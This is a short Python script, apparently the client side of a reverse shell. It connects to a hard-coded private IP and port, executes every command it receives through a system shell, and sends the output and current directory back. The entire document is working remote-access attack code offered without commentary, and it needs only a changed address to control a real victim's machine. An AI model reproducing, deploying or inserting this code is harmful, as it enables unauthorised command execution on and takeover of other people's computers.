import socket
import os
import subprocess

client_socket = socket.socket()
host = '192.168.56.1'
port = 1025

client_socket.connect((host, port))
print('\nConnection successfully created')

while True:
    data = client_socket.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        current_WD = os.getcwd() + '>'
        client_socket.send(str.encode(output_str + current_WD))